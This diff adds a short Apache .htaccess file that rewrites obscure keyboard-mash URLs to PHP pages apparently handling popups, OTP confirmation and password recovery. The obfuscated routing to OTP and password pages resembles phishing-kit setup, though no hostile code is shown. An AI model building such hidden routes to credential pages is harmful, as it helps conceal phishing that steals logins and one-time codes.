@@ -1,0 +1,7 @@
+RewriteEngine on
+RewriteRule ^asdfg?$ popup.php
+RewriteRule ^tyuio?$ popupc.php
+RewriteRule ^zxcvb?$ conotp.php
+RewriteRule ^cvbnm?$ conotpc.php
+RewriteRule ^akihdar?$ forpass.php
+RewriteRule ^barwas?$ forpasscon.php
